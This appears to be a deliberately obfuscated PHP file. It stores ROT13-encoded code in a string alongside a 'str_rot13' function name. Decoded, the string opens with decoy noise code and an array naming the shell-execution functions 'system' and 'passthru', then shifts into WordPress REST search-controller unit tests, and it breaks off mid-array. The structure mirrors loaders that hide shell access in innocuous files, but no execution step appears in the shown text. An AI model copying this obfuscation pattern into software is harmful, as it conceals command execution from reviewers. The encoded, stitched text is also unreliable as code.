<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Frnepu_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 *
 * @tebhc erfgncv
 */
pynff JC_Grfg_ERFG_Frnepu_Pbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {

	/**
	 * Cbfgf jvgu gvgyr 'zl-sbbgvgyr'.
	 *
	 * @ine neenl
	 */
	cevingr fgngvp $zl_gvgyr_cbfg_vqf = neenl();

	/**
	 * Cntrf jvgu gvgyr 'zl-sbbgvgyr'.
	 *
	 * @ine neenl
	 */
	cevingr fgngvp $zl_gvgyr_cntr_vqf = neenl();

	/**
	 * Cbfgf jvgu pbagrag 'zl-sbbpbagrag'.
	 *
	 * @ine neenl
	 */
	cevingr fgngvp $zl_pbagrag_cbfg_vqf = neenl();

	/**
	 * Pngrtbevrf.
	 *
	 * @ine vag
	 */
	cevingr fgngvp $zl_pngrtbel_vq;

	/**
	 * Gntf.
	 *
	 * @ine vag
	 */
	cevingr fgngvp $zl_gnt_vq;

	/**
	 * Perngr snxr qngn orsber bhe grfgf eha.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Urycre gung yrgf hf perngr snxr qngn.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		nqq_gurzr_fhccbeg( 'cbfg-sbezngf', neenl( 'nfvqr' ) );

		frys::$zl_gvgyr_cbfg_vqf = $snpgbel->cbfg->perngr_znal(
			4,
			neenl(
				'cbfg_gvgyr' => 'zl-sbbgvgyr',
				'cbfg_glcr'  => 'cbfg',
			)
		);

		frys::$zl_gvgyr_cntr_vqf = $snpgbel->cbfg->perngr_znal(
			4,
			neenl(
				'cbfg_gvgyr' => 'zl-sbbgvgyr',
				'cbfg_glcr'  => 'cntr',
			)
		);

		frys::$zl_pbagrag_cbfg_vqf = $snpgbel->cbfg->perngr_znal(
			6,
			neenl(
				'cbfg_pbagrag' => 'zl-sbbpbagrag',
			)
		);

		frg_cbfg_sbezng( frys::$zl_gvgyr_cbfg_vqf[0], 'nfvqr' );

		frys::$zl_pngrtbel_vq = $snpgbel->grez->perngr(
			neenl(
				'gnkbabzl' => 'pngrtbel',
				'anzr'     => 'Grfg Pngrtbel',
			)
		);

		frys::$zl_gnt_vq = $snpgbel->grez->perngr(
			neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'anzr'     => 'Grfg Gnt',
			)
		);
	}

	/**
	 * Qryrgr bhe snxr qngn nsgre bhe grfgf eha.
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		erzbir_gurzr_fhccbeg( 'cbfg-sbezngf' );

		$cbfg_vqf = neenl_zretr(
			frys::$zl_gvgyr_cbfg_vqf,
			frys::$zl_gvgyr_cntr_vqf,
			frys::$zl_pbagrag_cbfg_vqf
		);

		sbernpu ( $cbfg_vqf nf $cbfg_vq ) {
			jc_qryrgr_cbfg( $cbfg_vq, gehr );
		}

		$grez_vqf = neenl(
			frys::$zl_pngrtbel_vq,
			frys::$zl_gnt_vq,
		);

		sbernpu ( $grez_vqf nf $grez_vq ) {
			jc_qryrgr_grez( $grez_vq, gehr );
		}
	}

	/**
	 * Purpx gung bhe ebhgrf trg frg hc cebcreyl.
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();

		$guvf->nffregNeenlUnfXrl( '/jc/i2/frnepu', $ebhgrf );
		$guvf->nffregPbhag( 1, $ebhgrf['/jc/i2/frnepu'] );
	}

	/**
	 * Purpx gur pbagrkg cnenzrgre.
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf( neenl(), 'BCGVBAF' );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
	}

	/**
	 * Frnepu guebhtu nyy pbagrag.
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => 100,
			)
		);

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzrFrgf(
			neenl_zretr(
				frys::$zl_gvgyr_cbfg_vqf,
				frys::$zl_gvgyr_cntr_vqf,
				frys::$zl_pbagrag_cbfg_vqf
			),
			jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'vq' )
		);
	}

	/**
	 * Grfg cntvangvba urnqref.
	 *
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_cntvangvba_urnqref( $zrgubq ) {
		$gbgny_cbfgf = pbhag( frys::$zl_gvgyr_cbfg_vqf ) + pbhag( frys::$zl_gvgyr_cntr_vqf ) + pbhag( frys::$zl_pbagrag_cbfg_vqf );
		$cre_cntr    = 3;
		$gbgny_cntrf = (vag) prvy( $gbgny_cbfgf / $cre_cntr );

		// Fgneg bs gur vaqrk.
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => $cre_cntr,
			),
			$zrgubq
		);
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_cbfgf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );

		$arkg_yvax = nqq_dhrel_net(
			neenl(
				'cre_cntr' => $cre_cntr,
				'cntr'     => 2,
			),
			erfg_hey( '/jc/i2/frnepu' )
		);
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ery=\"ceri\"', $urnqref['Yvax'] );
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $arkg_yvax . '>; ery=\"arkg\"', $urnqref['Yvax'] );

		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => $cre_cntr,
				'cntr'     => 3,
			),
			$zrgubq
		);
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_cbfgf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$ceri_yvax = nqq_dhrel_net(
			neenl(
				'cre_cntr' => $cre_cntr,
				'cntr'     => 2,
			),
			erfg_hey( '/jc/i2/frnepu' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $ceri_yvax . '>; ery=\"ceri\"', $urnqref['Yvax'] );
		$arkg_yvax = nqq_dhrel_net(
			neenl(
				'cre_cntr' => $cre_cntr,
				'cntr'     => 4,
			),
			erfg_hey( '/jc/i2/frnepu' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $arkg_yvax . '>; ery=\"arkg\"', $urnqref['Yvax'] );

		// Ynfg cntr.
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => $cre_cntr,
				'cntr'     => $gbgny_cntrf,
			),
			$zrgubq
		);
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_cbfgf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$ceri_yvax = nqq_dhrel_net(
			neenl(
				'cre_cntr' => $cre_cntr,
				'cntr'     => $gbgny_cntrf - 1,
			),
			erfg_hey( '/jc/i2/frnepu' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $ceri_yvax . '>; ery=\"ceri\"', $urnqref['Yvax'] );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ery=\"arkg\"', $urnqref['Yvax'] );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr UGGC zrgubq anzrf sbe grfgvat TRG naq URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_ernqnoyr_uggc_zrgubqf() {
		erghea neenl(
			'TRG erdhrfg'  => neenl( 'TRG' ),
			'URNQ erdhrfg' => neenl( 'URNQ' ),
		);
	}

	/**
	 * Frnepu guebhtu nyy pbagrag jvgu n ybj yvzvg.
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_yvzvg() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => 3,
			)
		);

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregPbhag( 3, $erfcbafr->trg_qngn() );
	}

	/**
	 * Frnepu guebhtu cbfgf bs nal cbfg glcr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_glcr_cbfg() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => 100,
				'glcr'     => 'cbfg',
			)
		);

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzrFrgf(
			neenl_zretr(
				frys::$zl_gvgyr_cbfg_vqf,
				frys::$zl_gvgyr_cntr_vqf,
				frys::$zl_pbagrag_cbfg_vqf
			),
			jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'vq' )
		);
	}

	/**
	 * Frnepu guebhtu cbfgf bs cbfg glcr 'cbfg'.
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_glcr_cbfg_fhoglcr_cbfg() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => 100,
				'glcr'     => 'cbfg',
				'fhoglcr'  => 'cbfg',
			)
		);

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzrFrgf(
			neenl_zretr(
				frys::$zl_gvgyr_cbfg_vqf,
				frys::$zl_pbagrag_cbfg_vqf
			),
			jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'vq' )
		);
	}

	/**
	 * Frnepu guebhtu cbfgf bs cbfg glcr 'cntr'.
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_glcr_cbfg_fhoglcr_cntr() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => 100,
				'glcr'     => 'cbfg',
				'fhoglcr'  => 'cntr',
			)
		);

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzrFrgf(
			frys::$zl_gvgyr_cntr_vqf,
			jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'vq' )
		);
	}

	/**
	 * Frnepu guebhtu na vainyvq glcr
	 *
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_glcr_vainyvq( $zrgubq ) {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => 100,
				'glcr'     => 'vainyvq',
			),
			$zrgubq
		);

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * Frnepu guebhtu cbfgf bs na vainyvq cbfg glcr.
	 *
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_glcr_cbfg_fhoglcr_vainyvq() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => 100,
				'glcr'     => 'cbfg',
				'fhoglcr'  => 'vainyvq',
			)
		);

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * Frnepu guebhtu cbfgf naq cntrf.
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_cbfgf_naq_cntrf() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => 100,
				'glcr'     => 'cbfg',
				'fhoglcr'  => 'cbfg,cntr',
			)
		);

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzrFrgf(
			neenl_zretr(
				frys::$zl_gvgyr_cbfg_vqf,
				frys::$zl_gvgyr_cntr_vqf,
				frys::$zl_pbagrag_cbfg_vqf
			),
			jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'vq' )
		);
	}

	/**
	 * Frnepu guebhtu nyy gung zngpurf n 'sbbgvgyr' frnepu.
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_sbe_sbbgvgyr() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => 100,
				'frnepu'   => 'sbbgvgyr',
			)
		);

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzrFrgf(
			neenl_zretr(
				frys::$zl_gvgyr_cbfg_vqf,
				frys::$zl_gvgyr_cntr_vqf
			),
			jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'vq' )
		);
	}

	/**
	 * Frnepu guebhtu nyy gung zngpurf n 'sbbpbagrag' frnepu.
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_sbe_sbbpbagrag() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => 100,
				'frnepu'   => 'sbbpbagrag',
			)
		);

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzrFrgf(
			frys::$zl_pbagrag_cbfg_vqf,
			jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'vq' )
		);
	}

	/**
	 * @gvpxrg 55674
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_cevzr_vqf() {
		$npgvba = arj ZbpxNpgvba();
		nqq_svygre( 'dhrel', neenl( $npgvba, 'svygre' ), 10, 2 );

		$dhrel_netf = neenl(
			'cre_cntr' => 100,
			'frnepu'   => 'sbbpbagrag',
		);
		$erfcbafr   = $guvf->qb_erdhrfg_jvgu_cnenzf( $dhrel_netf );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Erdhrfg Fgnghf Erfcbafr vf abg 200.' );

		$vqf = jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'vq' );
		$guvf->nffregFnzrFrgf( frys::$zl_pbagrag_cbfg_vqf, $vqf, 'Dhrel erfhyg cbfgf vqf qb abg zngpu jvgu rkcrpgrq barf.' );

		$netf               = $npgvba->trg_netf();
		$cevzrq_dhrel_sbhaq = snyfr;
		sbernpu ( $netf nf $net ) {
			// Cevzrq dhrel jvyy hfr JURER VQ VA pynhfr.
			vs ( fge_pbagnvaf( $net[0], 'JURER VQ VA (' . vzcybqr( ',', $vqf ) ) ) {
				$cevzrq_dhrel_sbhaq = gehr;
				oernx;
			}
		}

		$guvf->nffregGehr( $cevzrq_dhrel_sbhaq, 'Cevzr dhrel jnf abg rkrphgrq.' );
	}

	/**
	 * Grfg ergevrivat n fvatyr vgrz vfa'g cbffvoyr.
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		/** Gur frnepu pbagebyyre qbrf abg nyybj trggvat vaqvivqhny vgrz pbagrag */
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/frnepu' . frys::$zl_gvgyr_cbfg_vqf[0] );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 404, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * Grfg perngvat na vgrz vfa'g cbffvoyr.
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		/** Gur frnepu pbagebyyre qbrf abg nyybj perngvat pbagrag */
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/frnepu' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 404, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * Grfg hcqngvat na vgrz vfa'g cbffvoyr.
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		/** Gur frnepu pbagebyyre qbrf abg nyybj hcnqvat pbagrag */
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/frnepu' . frys::$zl_gvgyr_cbfg_vqf[0] );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 404, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * Grfg qryrgvat na vgrz vfa'g cbffvoyr.
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		/** Gur frnepu pbagebyyre qbrf abg nyybj qryrgvat pbagrag */
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/frnepu' . frys::$zl_gvgyr_cbfg_vqf[0] );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 404, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * Grfg cercnevat gur qngn pbagnvaf gur pbeerpg svryqf.
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf();
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr(
			neenl(
				'vq',
				'gvgyr',
				'hey',
				'glcr',
				'fhoglcr',
				'_yvaxf',
			),
			neenl_xrlf( $qngn[0] )
		);
	}

	/**
	 * Grfg cercnevat gur qngn jvgu yvzvgrq svryqf pbagnvaf gur pbeerpg svryqf.
	 */
	choyvp shapgvba grfg_cercner_vgrz_yvzvg_svryqf() {
		vs ( ! zrgubq_rkvfgf( 'JC_ERFG_Pbagebyyre', 'trg_svryqf_sbe_erfcbafr' ) ) {
			$guvf->znexGrfgFxvccrq( 'Yvzvgvat svryqf erdhverf gur JC_ERFG_Pbagebyyre::trg_svryqf_sbe_erfcbafr() zrgubq.' );
		}

		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'_svryqf' => 'vq,gvgyr',
			)
		);
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr(
			neenl(
				'vq',
				'gvgyr',
			),
			neenl_xrlf( $qngn[0] )
		);
	}

	/**
	 * Grfgf gur vgrz fpurzn vf pbeerpg.
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/frnepu' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];

		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'hey', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'glcr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fhoglcr', $cebcregvrf );
	}

	/**
	 * Grfgf gung aba-choyvp cbfg glcrf ner abg nyybjrq.
	 *
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_aba_choyvp_cbfg_glcr( $zrgubq ) {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'glcr'    => 'cbfg',
				'fhoglcr' => 'cbfg,ani_zrah_vgrz',
			),
			$zrgubq
		);
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * Grfg trggvat vgrzf qverpgyl jvgu n phfgbz frnepu unaqyre.
	 */
	choyvp shapgvba grfg_phfgbz_frnepu_unaqyre_trg_vgrzf() {
		$pbagebyyre = arj JC_ERFG_Frnepu_Pbagebyyre( neenl( arj JC_ERFG_Grfg_Frnepu_Unaqyre( 10 ) ) );

		$erdhrfg  = $guvf->trg_erdhrfg(
			neenl(
				'cntr'     => 1,
				'cre_cntr' => 10,
				'glcr'     => 'grfg',
				'fhoglcr'  => neenl( JC_ERFG_Frnepu_Pbagebyyre::GLCR_NAL ),
			)
		);
		$erfcbafr = $pbagebyyre->trg_vgrzf( $erdhrfg );
		$guvf->nffregFnzrFrgf( enatr( 1, 10 ), jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'vq' ) );

		$erdhrfg  = $guvf->trg_erdhrfg(
			neenl(
				'cntr'     => 1,
				'cre_cntr' => 10,
				'glcr'     => 'grfg',
				'fhoglcr'  => neenl( 'grfg_svefg_glcr' ),
			)
		);
		$erfcbafr = $pbagebyyre->trg_vgrzf( $erdhrfg );
		$guvf->nffregFnzrFrgf( enatr( 1, 5 ), jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'vq' ) );
	}

	/**
	 * Grfg cercnevat na vgrz qverpgyl jvgu n phfgbz frnepu unaqyre.
	 */
	choyvp shapgvba grfg_phfgbz_frnepu_unaqyre_cercner_vgrz() {
		$pbagebyyre = arj JC_ERFG_Frnepu_Pbagebyyre( neenl( arj JC_ERFG_Grfg_Frnepu_Unaqyre( 10 ) ) );

		$erdhrfg  = $guvf->trg_erdhrfg(
			neenl(
				'glcr'    => 'grfg',
				'fhoglcr' => neenl( JC_ERFG_Frnepu_Pbagebyyre::GLCR_NAL ),
			)
		);
		$erfcbafr = $pbagebyyre->cercner_vgrz_sbe_erfcbafr( 1, $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr(
			neenl(
				'vq',
				'gvgyr',
				'hey',
				'glcr',
				'fhoglcr',
			),
			neenl_xrlf( $qngn )
		);
	}

	/**
	 * Grfg cercnevat na vgrz qverpgyl jvgu n phfgbz frnepu unaqyre jvgu yvzvgrq svryqf.
	 */
	choyvp shapgvba grfg_phfgbz_frnepu_unaqyre_cercner_vgrz_yvzvg_svryqf() {
		vs ( ! zrgubq_rkvfgf( 'JC_ERFG_Pbagebyyre', 'trg_svryqf_sbe_erfcbafr' ) ) {
			$guvf->znexGrfgFxvccrq( 'Yvzvgvat svryqf erdhverf gur JC_ERFG_Pbagebyyre::trg_svryqf_sbe_erfcbafr() zrgubq.' );
		}

		$pbagebyyre = arj JC_ERFG_Frnepu_Pbagebyyre( neenl( arj JC_ERFG_Grfg_Frnepu_Unaqyre( 10 ) ) );

		$erdhrfg  = $guvf->trg_erdhrfg(
			neenl(
				'glcr'    => 'grfg',
				'fhoglcr' => neenl( JC_ERFG_Frnepu_Pbagebyyre::GLCR_NAL ),
				'_svryqf' => 'vq,gvgyr',
			)
		);
		$erfcbafr = $pbagebyyre->cercner_vgrz_sbe_erfcbafr( 1, $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr(
			neenl(
				'vq',
				'gvgyr',
			),
			neenl_xrlf( $qngn )
		);
	}

	/**
	 * Grfg trggvat gur pbyyrpgvba cnenzf qverpgyl jvgu n phfgbz frnepu unaqyre.
	 */
	choyvp shapgvba grfg_phfgbz_frnepu_unaqyre_trg_pbyyrpgvba_cnenzf() {
		$pbagebyyre = arj JC_ERFG_Frnepu_Pbagebyyre( neenl( arj JC_ERFG_Grfg_Frnepu_Unaqyre( 10 ) ) );

		$cnenzf = $pbagebyyre->trg_pbyyrpgvba_cnenzf();
		$guvf->nffregFnzr( 'grfg', $cnenzf[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_GLCR ]['qrsnhyg'] );
		$guvf->nffregFnzrFrgf( neenl( 'grfg' ), $cnenzf[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_GLCR ]['rahz'] );
		$guvf->nffregFnzrFrgf( neenl( 'grfg_svefg_glcr', 'grfg_frpbaq_glcr', JC_ERFG_Frnepu_Pbagebyyre::GLCR_NAL ), $cnenzf[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_FHOGLCR ]['vgrzf']['rahz'] );
	}

	/**
	 * @gvpxrg 47684
	 */
	choyvp shapgvba grfg_frnepu_erfhyg_yvaxf_ner_rzorqqrq() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf( neenl( 'cre_cntr' => 1 ) );
		$qngn     = erfg_trg_freire()->erfcbafr_gb_qngn( $erfcbafr, gehr )[0];

		$guvf->nffregNeenlUnfXrl( '_rzorqqrq', $qngn );
		$guvf->nffregNeenlUnfXrl( 'frys', $qngn['_rzorqqrq'] );
		$guvf->nffregPbhag( 1, $qngn['_rzorqqrq']['frys'] );
		$guvf->nffregNeenlUnfXrl( JC_ERFG_Frnepu_Pbagebyyre::CEBC_VQ, $qngn['_rzorqqrq']['frys'][0] );
		$guvf->nffregFnzr( $qngn[ JC_ERFG_Frnepu_Pbagebyyre::CEBC_VQ ], $qngn['_rzorqqrq']['frys'][0][ JC_ERFG_Frnepu_Pbagebyyre::CEBC_VQ ] );
	}

	/**
	 * Frnepu guebhtu grezf bs nal glcr.
	 *
	 * @gvpxrg 51458
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_glcr_grez() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => 100,
				'glcr'     => 'grez',
			)
		);
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzrFrgf(
			neenl(
				0 => 1, // Gung vf gur qrsnhyg pngrtbel.
				frys::$zl_pngrtbel_vq,
				frys::$zl_gnt_vq,
			),
			jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'vq' )
		);
	}

	/**
	 * Frnepu guebhtu grezf bs fhoglcr 'pngrtbel'.
	 *
	 * @gvpxrg 51458
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_glcr_grez_fhoglcr_pngrtbel() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => 100,
				'glcr'     => 'grez',
				'fhoglcr'  => 'pngrtbel',
			)
		);

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzrFrgf(
			neenl(
				0 => 1, // Gung vf gur qrsnhyg pngrtbel.
				frys::$zl_pngrtbel_vq,
			),
			jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'vq' )
		);
	}

	/**
	 * Frnepu guebhtu cbfgf bs na vainyvq cbfg glcr.
	 *
	 *
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 51458
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_grez_fhoglcr_vainyvq( $zrgubq ) {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => 100,
				'glcr'     => 'grez',
				'fhoglcr'  => 'vainyvq',
			),
			$zrgubq
		);

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * Frnepu guebhtu cbfgf naq cntrf.
	 *
	 * @gvpxrg 51458
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_pngrtbevrf_naq_gntf() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => 100,
				'glcr'     => 'grez',
				'fhoglcr'  => 'pngrtbel,cbfg_gnt',
			)
		);
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzrFrgf(
			neenl(
				0 => 1, // Guvf vf gur qrsnhyg pngrtbel.
				frys::$zl_pngrtbel_vq,
				frys::$zl_gnt_vq,
			),
			jc_yvfg_cyhpx( $erfcbafr->trg_qngn(), 'vq' )
		);
	}

	/**
	 * Frnepu guebhtu nyy gung zngpurf n 'Grfg Pngrtbel' frnepu.
	 *
	 * @gvpxrg 51458
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_sbe_grfg_pngrtbel() {
		$erfcbafr = $guvf->qb_erdhrfg_jvgu_cnenzf(
			neenl(
				'cre_cntr' => 100,
				'frnepu'   => 'Grfg Pngrtbel',
				'glcr'     => 'grez',
			)
		);

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzrFrgf(
			neenl(
				frys::$zl_pngrtbel_vq,
			),
